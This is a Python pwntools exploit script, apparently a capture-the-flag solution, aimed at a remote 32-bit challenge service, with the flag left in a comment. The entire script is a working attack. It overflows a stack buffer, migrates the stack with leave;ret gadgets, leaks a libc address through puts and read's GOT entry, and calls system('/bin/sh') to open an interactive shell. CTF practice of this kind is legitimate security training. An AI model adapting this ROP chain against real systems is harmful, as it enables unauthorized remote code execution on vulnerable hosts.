from pwn import *

#FLAG{st4ck_m1gr4ti0n_1s_p0w3rful}

host = 'csie.ctf.tw'
port = 10141
y = remote(host , port)


main = 0x080484ab
count = 0x804a008
read_plt = 0x8048380
puts_plt = 0x8048390
read_got = 0x08049fe8
pop_ret = 0x0804836d
pop_ebp = 0x0804856b
leave_ret = 0x08048418
read_ofs = 0xd41c0
bsh_ofs = 0x158e8b
syt_ofs = 0x3a940


p = 'a' * 0x28
p += p32(count + 0x300)
p += p32(read_plt)
p += p32(leave_ret)
p += p32(0x0)
p += p32(count + 0x300)
p += p32(0x100)

y.sendafter(':',p)

mgr = 'AAAA'
mgr += p32(puts_plt)
mgr += p32(pop_ebp)
mgr += p32(read_got)
mgr += p32(read_plt)
mgr += p32(pop_ret)
mgr += p32(0x0)
mgr += p32(count + 0x31c)
mgr += p32(0x10)

y.send(mgr)

y.recvline()
read_ad = u32( y.recv(4) )
libc_base = read_ad - read_ofs
system = libc_base + syt_ofs
bsh = libc_base + bsh_ofs

log.info(hex(read_ad))
log.info(hex(system))
log.info(hex(bsh))

p = p32(system)
p += 'AAAA'
p += p32(bsh)

y.send(p)

y.interactive()
